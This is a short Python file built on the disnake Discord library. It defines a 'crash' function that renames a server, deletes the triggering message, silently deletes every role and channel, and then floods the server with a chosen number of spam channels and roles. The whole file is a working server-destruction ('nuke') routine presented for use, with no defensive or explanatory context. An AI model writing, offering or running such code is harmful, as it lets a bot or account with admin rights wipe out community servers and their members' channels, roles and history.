import disnake
from disnake.ext import commands
import asyncio


async def crash(ctx, crashname, rolereason, chreasone, channelname, rolename, numberchann: int, numberole: int):
        guild = ctx.message.guild     
        await guild.edit(name=crashname)

        await ctx.message.delete()

        for m in ctx.guild.roles:
            try:
                await m.delete(reason=rolereason)
            except:
                pass

        for channel in ctx.guild.channels:
                try:
                        await channel.delete(reason=chreasone)
                except:
                        pass


        for _ in range(numberchann):
            await guild.create_text_channel(channelname)

        for _ in range(numberole):
          await guild.create_role(name=rolename)
